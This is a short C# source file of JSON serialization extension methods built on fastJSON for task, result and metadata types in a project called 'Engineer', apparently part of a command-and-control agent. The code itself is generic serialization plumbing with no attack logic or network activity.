using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Threading.Tasks;
using Engineer.Commands;
using Engineer.Models;
using fastJSON;

namespace Engineer
{
	public static class Extensions
	{
        public static IEnumerable<Type> GetseralTypes()
        {
            return new List<Type>()
            {
	            typeof(EngineerCommand),
                typeof(EngineerTask),
                typeof(List<EngineerTask>),
                typeof(EngineerTaskResult),
                typeof(List<EngineerTaskResult>),
                typeof(EngineerMetadata),
                typeof(List<EngineerMetadata>),
                typeof(C2TaskMessage),
                typeof(List<C2TaskMessage>),
        };
        }

		public static byte[] JsonSerialize<T>(this T data)
		{
            try
            {
                JSONParameters jsonParameters = new JSONParameters();
                jsonParameters.UseValuesOfEnums = true;
                string json = JSON.ToJSON(data,jsonParameters);
                return Encoding.UTF8.GetBytes(json);
            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
                return null;
            }
        }

        public static T JsonDeserialize<T>(this byte[] data)
        {
            try
            {
                string json = Encoding.UTF8.GetString(data);
                return JSON.ToObject<T>(json);
            }
            catch (Exception e)
            {
                //Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
                return default;
            }
        }
    }
}
